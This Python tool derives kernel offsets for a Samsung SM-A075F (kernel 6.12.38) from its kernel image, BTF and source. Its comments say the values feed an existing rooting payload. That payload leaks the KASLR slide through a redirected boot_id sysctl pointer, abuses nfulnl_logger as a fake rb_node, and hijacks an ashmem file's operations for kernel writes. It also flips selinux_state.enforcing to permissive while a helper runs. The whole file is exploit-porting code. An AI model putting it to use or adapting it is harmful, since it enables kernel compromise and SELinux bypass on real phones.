#!/usr/bin/env python3
"""Derive SM-A075F (kernel 6.12.38) image facts from the verified kernel.elf, BTF and source.

What the existing payload needs from a target, and how each item is obtained here:

* `SLIDE_NFULNL_LOGGER_OBJECT_OFF` - address of the `nfulnl_logger` object. `src/util.c:1800`
  uses its first 8 bytes as a fake rb_node `__rb_parent_color` slot and `src/fops.c:314` restores
  the following 8 bytes, so it has to be a writable kernel data object. Taken from the symbol
  table; the section has to be writable.
* `SLIDE_NFULNL_LOGGER_NAME_OFF` - address of the `"nfnetlink_log"` string. `src/slide_app.c:2010`
  computes `stext = leaked - off`, and the leaked bytes are what `/proc/sys/kernel/random/boot_id`
  returns once the sysctl `data` pointer has been redirected, i.e. the value of
  `nfulnl_logger.name`. Read out of the image and verified by the string it points at.
* `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` - address of the `.data` field of the `boot_id` entry
  of `random_table`; the field the payload overwrites and later restores. Found by walking the
  table and matching each entry's `procname` string, so the entry is identified by content.
* `SLIDE_SYSCTL_BOOTID_OFF` - the original value of that `.data` pointer: the boot_id storage the
  restore path writes back (`src/fops.c:295`).
* ashmem/SELinux/`struct slab`/workqueue facts - censuses and layout checks that decide whether the
  old primitive still exists on this kernel, and what replaces it.

Every value is either read from the image and verified against a second observation, or reported as
unresolved. Nothing is inferred from another device's header, and no value is emitted without the
check that justifies it.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from tools.a07_elf import ElfError, ElfImage  # noqa: E402
from tools.extract_a07_offsets import (  # noqa: E402
    extract_kernel_source,
    make_btf_elf,
    pahole_type,
)

MODEL = "SM-A075F"
KERNEL_VERSION = "6.12.38"
LOGGER_STRING = "nfnetlink_log"
BOOT_ID_PROCNAME = "boot_id"
MAX_TABLE_ENTRIES = 64

# Sections whose contents the kernel may write at runtime. A scratch target outside them would be
# a read-only mapping, and writing it faults instead of sliding anything.
WRITABLE_SECTION_PREFIXES = (".data", ".bss")
READONLY_AFTER_INIT = ".data..ro_after_init"
# Sections the kernel maps read-only once boot finishes, whatever the ELF flags say: a
# `__ro_after_init` object *is* SHF_WRITE in vmlinux, because it is writable until mark_rodata_ro().
RUNTIME_READONLY_NAME_PREFIXES = (".data..ro_after_init", ".rodata", ".init", ".text", ".exit")


def image_offset(address: int, text_base: int) -> int | None:
    return address - text_base if address >= text_base else None


def section_kind(image: ElfImage, address: int) -> str:
    """The section an address falls in, so writability can be checked rather than assumed."""
    best = ""
    for section in image.sections:
        if section.addr and section.size and section.addr <= address < section.addr + section.size:
            if len(section.name) > len(best):
                best = section.name
    return best or "(unknown)"


def writable(section: str) -> bool:
    return section.startswith(WRITABLE_SECTION_PREFIXES) and section != READONLY_AFTER_INIT


def writability(image: ElfImage, address: int) -> dict[str, Any]:
    """Is this image address writable *at runtime*, and what exactly says so?

    The name check alone is not enough: A07's kernel.elf puts some objects in a section literally
    named `.kernel`, which carries no information. The ELF's own SHF_WRITE bit and the PF_W flag of
    the enclosing PT_LOAD are then the evidence, and the answer says which of the three decided it.
    """
    section = image.section_at(address)
    segment = image.segment_at(address)
    name = section.name if section else "(no section)"
    segment_flags = "".join(
        flag for flag, bit in (("R", 4), ("W", 2), ("X", 1))
        if segment is not None and segment.flags & bit
    ) or "(none)"
    by_name = name.startswith(RUNTIME_READONLY_NAME_PREFIXES)
    specific_name = name.startswith(WRITABLE_SECTION_PREFIXES) or by_name
    shf_write = bool(section.shf_write) if section else False
    nobits = bool(section.nobits) if section else False
    segment_writable = segment is not None and bool(segment.flags & 2)
    if by_name:
        ok, why = False, f"section `{name}` is mapped read-only at runtime"
    elif specific_name:
        ok, why = True, f"section `{name}` is runtime-writable kernel data"
    elif shf_write and segment_writable:
        ok, why = True, (
            f"section name `{name}` is not specific in this ELF, but it carries SHF_WRITE and its "
            f"PT_LOAD segment is {segment_flags}"
        )
    else:
        ok, why = False, (
            f"section `{name}` (SHF_WRITE={shf_write}, nobits={nobits}) in PT_LOAD {segment_flags} "
            "is not shown to be writable"
        )
    return {
        "writable": ok,
        "section": name,
        "sectionFlags": f"0x{section.flags:x}" if section else None,
        "nobits": nobits,
        "segmentFlags": segment_flags,
        "specificName": specific_name,
        "reason": why,
    }


def symbol_fact(image: ElfImage, name: str, text_base: int) -> dict[str, Any] | None:
    symbol = image.symbol(name)
    if symbol is None:
        return None
    section = section_kind(image, symbol.value)
    return {
        "symbol": name,
        "bind": symbol.bind,
        "type": symbol.type,
        "size": symbol.size,
        "section": section,
        "writable": writable(section),
        "imageOffset": image_offset(symbol.value, text_base),
    }


def derive_slide_chain(image: ElfImage, layouts: dict[str, dict[str, int]], text_base: int) -> dict[str, Any]:
    """The four slide addresses, each with the observation that proves it."""
    out: dict[str, Any] = {}
    logger = image.symbol("nfulnl_logger")
    if logger is None:
        out["SLIDE_NFULNL_LOGGER_OBJECT_OFF"] = {"status": "unresolved", "reason": "no `nfulnl_logger` symbol in kernel.elf"}
    else:
        verdict = writability(image, logger.value)
        section = verdict["section"]
        out["SLIDE_NFULNL_LOGGER_OBJECT_OFF"] = {
            "status": "derived" if verdict["writable"] else "incompatible-section",
            "value": image_offset(logger.value, text_base) if verdict["writable"] else None,
            "symbol": "nfulnl_logger",
            "section": section,
            "writability": verdict,
            "evidence": f"symbol `nfulnl_logger` at 0x{logger.value:x}: {verdict['reason']}"
            + ("" if verdict["writable"] else
               ". src/util.c:1800 and src/fops.c:314 write and restore rb_node words inside this "
               "object, so on A07 it cannot serve as the slide scratch target; a writable "
               "replacement has to be chosen from A07's own image, not copied from another device."),
        }
        name_field = layouts.get("nf_logger", {}).get("name")
        if name_field is None:
            out["SLIDE_NFULNL_LOGGER_NAME_OFF"] = {
                "status": "unresolved",
                "reason": "BTF has no `nf_logger.name` member offset to read the string pointer at",
            }
        else:
            pointer = image.pointer(logger.value + name_field)
            text = image.cstring(pointer) if pointer else None
            ok = bool(pointer) and text == LOGGER_STRING
            out["SLIDE_NFULNL_LOGGER_NAME_OFF"] = {
                "status": "derived" if ok else "cross-check-failed",
                # A value whose cross-check failed is not reported as a value at all.
                "value": image_offset(pointer, text_base) if ok else None,
                "verifiedString": text,
                "evidence": (
                    f"*(nfulnl_logger + 0x{name_field:x}) = 0x{pointer:x} -> \"{text}\""
                    if pointer
                    else f"nf_logger.name at nfulnl_logger+0x{name_field:x} is not readable in the image"
                )
                + ("" if ok else f"; expected \"{LOGGER_STRING}\""),
            }

    table = image.symbol("random_table")
    ctl = layouts.get("ctl_table", {})
    procname_off, data_off = ctl.get("procname"), ctl.get("data")
    entry_size = layouts.get("__sizes__", {}).get("ctl_table")
    if table is None or procname_off is None or data_off is None or not entry_size:
        out["SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF"] = {
            "status": "unresolved",
            "reason": "need the `random_table` symbol plus BTF ctl_table.procname/.data and sizeof(ctl_table)",
            "have": {"random_table": table is not None, "procname": procname_off, "data": data_off,
                     "sizeof_ctl_table": entry_size},
        }
        out["SLIDE_SYSCTL_BOOTID_OFF"] = {"status": "unresolved", "reason": "depends on the boot_id table entry"}
        return out

    entry = None
    scanned = []
    for index in range(MAX_TABLE_ENTRIES):
        address = table.value + index * entry_size
        name_pointer = image.pointer(address + procname_off)
        if not name_pointer:
            break
        name = image.cstring(name_pointer)
        if name is None:
            break
        scanned.append(name)
        if name == BOOT_ID_PROCNAME:
            entry = address
            break
    if entry is None:
        out["SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF"] = {
            "status": "unresolved",
            "reason": f"no `{BOOT_ID_PROCNAME}` entry among the first {len(scanned)} random_table entries",
            "procnames": scanned,
        }
        out["SLIDE_SYSCTL_BOOTID_OFF"] = {"status": "unresolved", "reason": "depends on the boot_id table entry"}
        return out

    data_field = entry + data_off
    out["SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF"] = {
        "status": "derived",
        "value": image_offset(data_field, text_base),
        "evidence": (
            f"random_table entry {scanned.index(BOOT_ID_PROCNAME)} has procname \"{BOOT_ID_PROCNAME}\"; "
            f"its .data field is at 0x{data_field:x} (table 0x{table.value:x} + "
            f"{scanned.index(BOOT_ID_PROCNAME)} * 0x{entry_size:x} + 0x{data_off:x})"
        ),
        "procnames": scanned,
    }
    storage = image.pointer(data_field)
    storage_section = section_kind(image, storage) if storage else "(unreadable)"
    out["SLIDE_SYSCTL_BOOTID_OFF"] = {
        "status": "derived" if storage else "cross-check-failed",
        "value": image_offset(storage, text_base) if storage else None,
        "section": storage_section,
        "evidence": (
            f"the boot_id entry's .data pointer holds 0x{storage:x}, inside {storage_section}"
            if storage
            else "the boot_id .data pointer is not readable in the image"
        ),
    }
    return out


def derive_ashmem(image: ElfImage, layouts: dict[str, dict[str, int]], text_base: int) -> dict[str, Any]:
    """What ashmem looks like on this kernel, and which fops object carries its handlers."""
    symbols = [
        {
            "name": symbol.name,
            "bind": symbol.bind,
            "type": symbol.type,
            "size": symbol.size,
            "section": section_kind(image, symbol.value),
            "imageOffset": image_offset(symbol.value, text_base),
        }
        for symbol in image.names_starting_with("ashmem")
    ]
    fops_members = {name: offset for name, offset in layouts.get("file_operations", {}).items()}
    fops_size = layouts.get("__sizes__", {}).get("file_operations")
    handler_names = {symbol["name"] for symbol in symbols}
    candidates = []
    if fops_size and fops_members:
        for symbol in image.symbol_list:
            if symbol.type != "OBJECT" or not symbol.defined or symbol.value < text_base:
                continue
            raw = image.read(symbol.value, fops_size)
            if raw is None:
                continue
            resolved: dict[str, str] = {}
            for member, offset in sorted(fops_members.items(), key=lambda item: item[1]):
                pointer = int.from_bytes(raw[offset:offset + 8], "little") if offset + 8 <= len(raw) else 0
                if not pointer:
                    continue
                resolved[member] = image.symbol_at(pointer) or f"0x{pointer:x}"
            ashmem_fields = {k: v for k, v in resolved.items() if v in handler_names}
            if ashmem_fields:
                candidates.append({
                    "object": symbol.name,
                    "section": section_kind(image, symbol.value),
                    "imageOffset": image_offset(symbol.value, text_base),
                    "ashmemHandlers": ashmem_fields,
                    "allHandlers": resolved,
                })
    return {
        "symbols": symbols,
        "symbolNames": [symbol["name"] for symbol in symbols],
        "hasClassicFops": any(symbol["name"] in ("ashmem_fops", "ashmem_misc_fops") for symbol in symbols),
        "fopsCandidates": candidates,
        "note": (
            "The payload hijacks an ashmem file's f_op (src/util.c:728) so ASHMEM_SET_NAME keeps "
            "writing its 256-byte name into a kernel buffer while read_iter/write_iter become the "
            "configfs pair. Whether that primitive still exists depends on the handlers below and "
            "on the source audit, not on a symbol rename."
        ),
    }


def derive_selinux(image: ElfImage, layouts: dict[str, dict[str, int]], sizes: dict[str, int],
                   pahole_raw: dict[str, str], text_base: int) -> dict[str, Any]:
    """Every SELinux state candidate, plus the modern `selinux_state.enforcing` address."""
    interesting = ("selinux", "enforcing", "checkreqprot")
    facts = []
    for symbol in image.symbol_list:
        if not symbol.defined or not symbol.name.startswith(interesting):
            continue
        if symbol.type not in ("OBJECT", "NOTYPE"):
            continue
        section = section_kind(image, symbol.value)
        raw = image.read(symbol.value, 8)
        facts.append({
            "name": symbol.name,
            "type": symbol.type,
            "bind": symbol.bind,
            "size": symbol.size,
            "section": section,
            "writable": writable(section),
            "imageOffset": image_offset(symbol.value, text_base),
            "firstBytes": raw.hex() if raw else None,
        })
    facts.sort(key=lambda item: item["name"])

    # Modern kernels keep the runtime flag inside `struct selinux_state`; the boot-time
    # `selinux_enforcing_boot` is `__initdata`/`__ro_after_init` and cannot disable anything at
    # runtime. src/root.c reads and writes one byte, so `bool enforcing` is the right shape - but
    # only if this image proves the object exists, is writable, and has that member.
    derived: dict[str, Any] = {"status": "unresolved"}
    state = image.symbol("selinux_state")
    enforcing_off = layouts.get("selinux_state", {}).get("enforcing")
    if state is None:
        derived = {"status": "unresolved", "reason": "no `selinux_state` object symbol in kernel.elf"}
    elif enforcing_off is None:
        derived = {"status": "unresolved",
                   "reason": "BTF has no `selinux_state.enforcing` member offset",
                   "selinuxStateMembers": sorted(layouts.get("selinux_state", {}))}
    else:
        verdict = writability(image, state.value)
        section = verdict["section"]
        raw = pahole_raw.get("selinux_state", "")
        is_bool = bool(re.search(r"\benforcing\s*;\s*/\*", raw)) and "bool" in raw
        object_size = state.size or sizes.get("selinux_state") or 0
        fits = object_size == 0 or enforcing_off + 1 <= object_size
        current = image.read(state.value + enforcing_off, 1)
        # A zero-initialised object has no bytes in the file at all; that is not a contradiction.
        byte_ok = verdict["nobits"] or (current is not None and current[0] in (0, 1))
        ok = verdict["writable"] and fits and byte_ok
        derived = {
            "status": "derived" if ok else "cross-check-failed",
            "value": image_offset(state.value + enforcing_off, text_base) if ok else None,
            "symbol": "selinux_state",
            "section": section,
            "enforcingMemberOffset": enforcing_off,
            "objectSize": object_size,
            "byteInImage": current[0] if current else ("(nobits: no file bytes)" if verdict["nobits"] else None),
            "declaredBool": is_bool,
            "writability": verdict,
            "evidence": (
                f"`selinux_state` at 0x{state.value:x}, {verdict['reason']} (size 0x{object_size:x}); "
                f"BTF `enforcing` at +0x{enforcing_off:x}; byte in image = "
                f"{current[0] if current else ('absent because the object is zero-initialised' if verdict['nobits'] else 'unreadable')}"
                + ("" if ok else " - rejected: needs a runtime-writable section, a bool-sized member "
                                 "that fits the object, and a 0/1 byte when the image stores one")
            ),
        }
    return {
        "derivedEnforcing": derived,
        "candidates": facts,
        "note": (
            "src/root.c:191 reads one byte at SELINUX_ENFORCING, requires it to be 0 or 1, sets it "
            "permissive while the UMH helper runs, and restores it. A candidate only qualifies if "
            "it is a runtime-writable bool; `selinux_enforcing_boot` is a boot-time value and is "
            "read-only after init on modern kernels, so renaming to it would not disable anything."
        ),
    }


def derive_slab(layouts: dict[str, dict[str, int]], sizes: dict[str, int]) -> dict[str, Any]:
    """Whether `struct slab` still overlays `struct page`, member by member."""
    slab, page = layouts.get("slab", {}), layouts.get("page", {})
    mirrors = {"__page_flags": "flags", "__page_refcount": "_refcount", "__page_type": "page_type"}
    checks = []
    for slab_member, page_member in mirrors.items():
        slab_offset, page_offset = slab.get(slab_member), page.get(page_member)
        checks.append({
            "pair": f"slab.{slab_member} / page.{page_member}",
            "slabOffset": slab_offset,
            "pageOffset": page_offset,
            "agree": slab_offset is not None and slab_offset == page_offset,
        })
    slab_size, page_size = sizes.get("slab"), sizes.get("page")
    contained = slab_size is not None and page_size is not None and slab_size <= page_size
    cache_offset = slab.get("slab_cache")
    verified = all(item["agree"] for item in checks) and contained and cache_offset is not None
    return {
        "status": "derived" if verified else "cross-check-failed",
        "value": cache_offset if verified else None,
        "mirrorChecks": checks,
        "sizeofSlab": slab_size,
        "sizeofPage": page_size,
        "slabCacheOffset": cache_offset,
        "evidence": (
            f"struct slab mirrors struct page on {sum(item['agree'] for item in checks)}/{len(checks)} "
            f"declared pairs, sizeof(slab)=0x{slab_size:x} <= sizeof(page)=0x{page_size:x}, so "
            f"slab.slab_cache at 0x{cache_offset:x} is also a page-relative offset"
            if verified
            else "the overlay between struct slab and struct page is not proven member by member"
        ),
    }


def derive_workqueue(layouts: dict[str, dict[str, int]]) -> dict[str, Any]:
    """max_active moved off pool_workqueue; report where it is and how to reach it."""
    pwq, wq = layouts.get("pool_workqueue", {}), layouts.get("workqueue_struct", {})
    return {
        "pwqHasMaxActive": "max_active" in pwq,
        "wqMaxActiveOffset": wq.get("max_active"),
        "pwqWqOffset": pwq.get("wq"),
        "status": "derived" if ("max_active" not in pwq and wq.get("max_active") is not None
                                and pwq.get("wq") is not None) else "unresolved",
        "note": (
            "src/root.c:355 reads a u32 at `pwq + PWQ_MAX_ACTIVE_OFF`. On this kernel the limit is "
            "a workqueue_struct member, so the read has to go through `pwq->wq` - a source change, "
            "not a different offset for the same field."
        ),
    }


SOURCE_PROBES: tuple[tuple[str, str, str], ...] = (
    ("selinux enforcing declaration", r"security/selinux", r"^[^\n]*\benforcing\b[^\n]*(?:;|=)[^\n]*$"),
    ("selinux_state global definition", r"security/selinux", r"^(?:extern\s+)?struct\s+selinux_state\s+selinux_state[^\n]*$"),
    ("selinux_state struct members", r"security/selinux/include", r"struct\s+selinux_state\s*\{[^}]*\}"),
    ("ashmem SET_NAME handling", r"ashmem", r"ASHMEM_SET_NAME|ashmem_memfd_ioctl|set_name"),
    ("ashmem misc device registration", r"ashmem", r"misc_register|miscdevice|\.name\s*=\s*\"ashmem\""),
    ("ashmem CONFIG gating", r"arch/arm64/configs|drivers/(?:staging/)?android", r"CONFIG_ASHMEM|CONFIG_ANDROID_ASHMEM"),
    ("nfulnl_logger declaration", r"net/netfilter", r"^[^\n]*nf_logger\s+nfulnl_logger[^\n]*$|__ro_after_init[^\n]*$"),
    ("random_table boot_id entry", r"drivers/char", r"\"boot_id\"|random_table\[\]"),
    ("struct slab definition", r"include/linux", r"struct\s+slab\s*\{[^}]*\}"),
    ("rt_mutex_waiter definition", r"include/linux|kernel/locking", r"struct\s+rt_waiter_node\s*\{[^}]*\}|struct\s+rt_mutex_waiter\s*\{[^}]*\}"),
    ("arm64 memory map constants", r"arch/arm64/include/asm", r"#define\s+(PAGE_OFFSET|VMEMMAP_START|KIMAGE_VADDR|DIRECT_MAP_BASE|_PAGE_OFFSET|VA_BITS)\b[^\n]*$"),
)

# Files whose *path* names the driver answer "is the classic ashmem driver even in this tree"
# better than a content grep, which matches every misc device in the kernel.
PATH_CENSUS: tuple[tuple[str, str], ...] = (
    ("ashmem source files", r"ashmem"),
    ("selinux source files", r"security/selinux/(?:hooks|include/security)"),
)


# The sandbox cannot read the 360 MB Samsung archive, so the decisive declarations are quoted here
# as bounded excerpts: which ashmem implementation this kernel actually compiles, how the enforcing
# flag is declared, and what the slide-chain objects look like in source.
SOURCE_EXCERPTS: tuple[tuple[str, str, str, int, int, int], ...] = (
    # label, path regex, content regex, lines before, lines after, max matches
    ("ashmem_memfd_ioctl body", r"ashmem", r"\bashmem_memfd_ioctl\b", 4, 70, 2),
    ("ashmem area accessors", r"ashmem", r"\bashmem_area_(?:name|size|vmfile)\s*\(", 2, 30, 3),
    ("ashmem SET_NAME uapi", r"ashmem", r"ASHMEM_SET_NAME|ASHMEM_NAME_LEN|ASHMEM_NAME_PREFIX", 2, 4, 6),
    ("ashmem_rust_exports declarations", r"ashmem_rust_exports", r"^(?:#include|static|long|int|void|struct|EXPORT)", 0, 2, 40),
    ("ashmem Kconfig/Makefile gating", r"drivers/(?:staging/)?android/(?:Kconfig|Makefile)", r"ASHMEM", 2, 6, 6),
    ("CONFIG_ASHMEM in defconfigs", r"arch/arm64/configs|defconfig", r"ASHMEM", 1, 1, 8),
    ("selinux_state struct", r"security/selinux/include/security.h", r"struct\s+selinux_state\s*\{", 3, 28, 1),
    ("selinux enforcing accessors", r"security/selinux", r"enforcing_enabled|enforcing\s*=|selinux_enforcing_boot", 2, 6, 8),
    ("nfulnl_logger declaration", r"net/netfilter/nfnetlink_log.c", r"nfulnl_logger", 8, 10, 2),
    ("nf_logger struct", r"include/net/netfilter/nf_log.h", r"struct\s+nf_logger\s*\{", 2, 16, 1),
    ("boot_id sysctl entry", r"drivers/char/random.c", r"\"boot_id\"", 8, 12, 1),
    ("struct slab definition", r"mm/slab.h|include/linux/(?:slab|mm)\.h", r"struct\s+slab\s*\{", 3, 34, 1),
    ("shmem_file_operations definition", r"mm/shmem.c", r"shmem_file_operations\s*=|file_operations\s+shmem_file_operations", 3, 28, 1),
    ("memfd ashmem shim glue", r"\.(?:c|h|rs)$", r"ashmem_memfd|memfd_ashmem", 3, 20, 3),
)


EXCERPT_GROUPS: dict[str, tuple[str, ...]] = {
    "ashmem": (
        "ashmem_memfd_ioctl body",
        "ashmem area accessors",
        "ashmem SET_NAME uapi",
        "ashmem_rust_exports declarations",
        "memfd ashmem shim glue",
        "ashmem Kconfig/Makefile gating",
        "CONFIG_ASHMEM in defconfigs",
    ),
    "kernel-data": (
        "selinux_state struct",
        "nfulnl_logger declaration",
        "nf_logger struct",
        "boot_id sysctl entry",
        "struct slab definition",
        "shmem_file_operations definition",
    ),
}


def source_excerpts(source_root: Path, cache_limit: int = 6_000_000,
                    labels: tuple[str, ...] | None = None) -> dict[str, list[str]]:
    """Quote the lines that decide the port, so a reviewer can read them from CI annotations."""
    out: dict[str, list[str]] = {}
    if not source_root.is_dir():
        return out
    def wanted_file(path: Path) -> bool:
        if not path.is_file():
            return False
        return (path.suffix in {".c", ".h", ".rs", ".S"}
                or path.name in {"Kconfig", "Makefile"}
                or "defconfig" in path.name)

    files = [path for path in source_root.rglob("*") if wanted_file(path)]
    text_cache: dict[Path, str | None] = {}

    def read(path: Path) -> str | None:
        if path not in text_cache:
            try:
                text_cache[path] = path.read_text(errors="replace") if path.stat().st_size <= cache_limit else None
            except OSError:
                text_cache[path] = None
        return text_cache[path]

    for label, path_pattern, content_pattern, before, after, max_matches in SOURCE_EXCERPTS:
        if labels is not None and label not in labels:
            continue
        path_regex = re.compile(path_pattern)
        content_regex = re.compile(content_pattern, re.MULTILINE)
        quotes: list[str] = []
        for path in sorted(files, key=lambda item: len(item.relative_to(source_root).as_posix())):
            if len(quotes) >= max_matches:
                break
            relative = path.relative_to(source_root).as_posix()
            if not path_regex.search(relative):
                continue
            text = read(path)
            if not text:
                continue
            lines = text.splitlines()
            for match in list(content_regex.finditer(text))[:max_matches]:
                number = text.count("\n", 0, match.start())
                window = lines[max(0, number - before): number + after + 1]
                quotes.append(
                    f"{relative}:{number + 1}: "
                    + " ⏎ ".join(line.rstrip() for line in window)[:1800]
                )
                if len(quotes) >= max_matches:
                    break
        out[label] = quotes
    return out


def audit_source(source_root: Path, limit: int = 12) -> dict[str, list[dict[str, Any]]]:
    """Cited source evidence for each porting decision; no value is taken from prose alone."""
    findings: dict[str, list[dict[str, Any]]] = {}
    if not source_root.is_dir():
        return {"(source root missing)": [{"file": str(source_root), "line": 0, "text": "not extracted"}]}
    files = [path for path in source_root.rglob("*")
             if path.is_file() and (path.suffix in {".c", ".h", ".S"} or path.name in {"Kconfig", "Makefile"}
                                    or "defconfig" in path.name or "gki_defconfig" in path.name)]
    for label, pattern in PATH_CENSUS:
        regex = re.compile(pattern)
        matches = [path.relative_to(source_root).as_posix() for path in files
                   if regex.search(path.relative_to(source_root).as_posix())]
        findings[label] = [{"file": name, "line": 0, "text": "present in the source tree"}
                           for name in sorted(matches)[:limit]]
        if not matches:
            findings[label] = []
    for label, directory, pattern in SOURCE_PROBES:
        regex = re.compile(pattern, re.M)
        directory_regex = re.compile(directory)
        hits: list[dict[str, Any]] = []
        for path in files:
            relative = path.relative_to(source_root).as_posix()
            if not directory_regex.search(relative):
                continue
            try:
                text = path.read_text(errors="replace")
            except OSError:
                continue
            for match in regex.finditer(text):
                line = text[: match.start()].count("\n") + 1
                hits.append({"file": relative, "line": line, "text": match.group(0).strip()[:160]})
                if len(hits) >= limit:
                    break
            if len(hits) >= limit:
                break
        findings[label] = hits
    return findings


def layouts_from_btf(
    btf: Path, work: Path, wanted: tuple[str, ...]
) -> tuple[dict[str, dict[str, int]], dict[str, int], dict[str, str]]:
    """pahole the structures the derivations need, from the target's own BTF."""
    wrapper = work / "a07-derive-btf.elf"
    make_btf_elf(btf, wrapper)
    layouts: dict[str, dict[str, int]] = {}
    sizes: dict[str, int] = {}
    raws: dict[str, str] = {}
    for type_name in wanted:
        fields, _types, size, raw = pahole_type(wrapper, type_name)
        if fields:
            layouts[type_name] = fields
        if size:
            sizes[type_name] = size
        raws[type_name] = raw
    layouts["__sizes__"] = sizes
    return layouts, sizes, raws


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--kernel-elf", type=Path)
    parser.add_argument("--only", choices=("all", "excerpts"), default="all")
    parser.add_argument("--excerpt-group", action="append", choices=tuple(EXCERPT_GROUPS),
                        help="quote one group of source excerpts in its own annotation budget")
    parser.add_argument("--btf", type=Path)
    parser.add_argument("--text-base", type=lambda value: int(value, 0))
    parser.add_argument("--symbol-offsets", type=Path, help="extractor JSON carrying imageTextBase")
    parser.add_argument("--source-root", type=Path)
    parser.add_argument("--source-zip", type=Path, help="Samsung opensource zip to extract for the source audit")
    parser.add_argument("--output-dir", required=True, type=Path)
    parser.add_argument("--work-dir", type=Path)
    parser.add_argument("--github", action="store_true", help="emit ::notice::/::error:: commands")
    args = parser.parse_args()

    def emit(level: str, message: str) -> None:
        print(f"::{level}::{message}" if args.github else message)

    if args.only == "excerpts":
        if not args.source_root or not args.source_root.is_dir():
            emit("error", "--only excerpts needs --source-root pointing at the extracted Samsung source")
            return 1
        groups = args.excerpt_group or sorted(EXCERPT_GROUPS)
        labels = tuple(label for group in groups for label in EXCERPT_GROUPS[group])
        excerpts = source_excerpts(args.source_root, labels=labels)
        out_dir = args.output_dir
        out_dir.mkdir(parents=True, exist_ok=True)
        (out_dir / f"source-excerpts-{'-'.join(sorted(groups))}.json").write_text(
            json.dumps({"sourceRoot": str(args.source_root), "excerpts": excerpts},
                       indent=2, sort_keys=True) + "\n"
        )
        for label in labels:
            quotes = excerpts.get(label) or []
            emit("notice" if quotes else "error",
                 f"src[{label}] " + (" ||| ".join(quotes)[:3000] if quotes
                                     else "(no match in the extracted Samsung source)"))
        return 0

    if args.kernel_elf is None:
        emit("error", "--kernel-elf is required unless --only excerpts is used")
        return 1
    text_base = args.text_base
    if text_base is None and args.symbol_offsets and args.symbol_offsets.is_file():
        raw = json.loads(args.symbol_offsets.read_text()).get("imageTextBase")
        text_base = int(raw, 0) if raw else None
    if text_base is None:
        print("::error::no kernel image text base; cannot express any offset" if args.github
              else "no kernel image text base")
        return 1

    out_dir = args.output_dir
    out_dir.mkdir(parents=True, exist_ok=True)
    work = args.work_dir or out_dir / "work"
    work.mkdir(parents=True, exist_ok=True)

    try:
        image = ElfImage(args.kernel_elf)
    except (ElfError, OSError) as error:
        print(f"::error::kernel.elf could not be read: {error}" if args.github else f"kernel.elf: {error}")
        return 1

    wanted = ("nf_logger", "ctl_table", "file_operations", "slab", "page", "pool_workqueue",
              "workqueue_struct", "rt_mutex_waiter", "rt_waiter_node", "selinux_state",
              "sk_buff", "nf_hook_ops")
    layouts: dict[str, dict[str, int]] = {}
    sizes: dict[str, int] = {}
    pahole_raw: dict[str, str] = {}
    btf_error = None
    if args.btf and args.btf.is_file():
        try:
            layouts, sizes, pahole_raw = layouts_from_btf(args.btf, work, wanted)
        except Exception as error:  # a BTF failure is reported, never worked around
            btf_error = str(error)
    else:
        btf_error = "no vmlinux.btf supplied"

    facts: dict[str, Any] = {
        "model": MODEL,
        "kernelVersion": KERNEL_VERSION,
        "imageTextBase": f"0x{text_base:x}",
        "btfError": btf_error,
        "btfStructSizes": sizes,
        "slideChain": derive_slide_chain(image, layouts, text_base),
        "ashmem": derive_ashmem(image, layouts, text_base),
        "selinux": derive_selinux(image, layouts, sizes, pahole_raw, text_base),
        "slab": derive_slab(layouts, sizes),
        "workqueue": derive_workqueue(layouts),
        "waiterLayout": {
            "rt_mutex_waiter": layouts.get("rt_mutex_waiter", {}),
            "rt_waiter_node": layouts.get("rt_waiter_node", {}),
        },
    }
    source_root = args.source_root
    if source_root is None and args.source_zip and args.source_zip.is_file():
        try:
            source_root, member = extract_kernel_source(args.source_zip, work / "source")
            facts["sourceArchiveMember"] = member
        except Exception as error:  # a source failure is evidence, not a reason to stop
            facts["sourceAuditError"] = str(error)
    if source_root:
        facts["sourceRoot"] = str(source_root)
        facts["sourceAudit"] = audit_source(source_root)
        facts["sourceExcerpts"] = source_excerpts(source_root)

    (out_dir / "image-facts.json").write_text(json.dumps(facts, indent=2, sort_keys=True, default=str) + "\n")

    slide = facts["slideChain"]
    derived = sorted(name for name, item in slide.items() if item.get("status") == "derived")
    unresolved = sorted(name for name, item in slide.items() if item.get("status") != "derived")
    emit("notice", "Slide chain derived from A07 kernel.elf: "
         + (", ".join(f"{name}=0x{slide[name]['value']:x}" for name in derived) or "(none)")
         + (f"; unresolved: {', '.join(unresolved)}" if unresolved else ""))
    for name in unresolved:
        emit("error", f"{name}: {slide[name].get('reason') or slide[name].get('evidence')}")
    ashmem = facts["ashmem"]
    emit("notice", f"ashmem symbols in A07 kernel.elf ({len(ashmem['symbols'])}): "
         + (", ".join(f"{i['name']}[{i['type']}/{i['section']}]" for i in ashmem["symbols"][:14]) or "(none)")
         + f"; classic ashmem_fops/ashmem_misc_fops present: {ashmem['hasClassicFops']}")
    for candidate in ashmem["fopsCandidates"][:6]:
        emit("notice", f"fops object {candidate['object']} (offset 0x{candidate['imageOffset']:x}) handlers: "
             + ", ".join(f"{k}={v}" for k, v in sorted(candidate["allHandlers"].items())))
    selinux = facts["selinux"]
    enforcing = selinux["derivedEnforcing"]
    emit("notice" if enforcing.get("status") == "derived" else "error",
         f"SELinux enforcing derivation: {enforcing.get('status')} - "
         + (enforcing.get("evidence") or enforcing.get("reason") or "")
         + (f"; value=0x{enforcing['value']:x}" if enforcing.get("value") is not None else ""))
    emit("notice", f"struct slab overlay: {facts['slab']['status']} - {facts['slab']['evidence']}")
    emit("notice", f"workqueue max_active: pwq has it = {facts['workqueue']['pwqHasMaxActive']}, "
                   f"workqueue_struct.max_active = {facts['workqueue']['wqMaxActiveOffset']}, "
                   f"pwq.wq = {facts['workqueue']['pwqWqOffset']}")
    if btf_error:
        emit("error", f"BTF layouts unavailable, so structure-dependent derivations are unresolved: {btf_error}")
    # Source excerpts and the full audit lists are quoted by the dedicated --only excerpts steps,
    # which get their own annotation budget; repeating them here would push the decisions out.
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
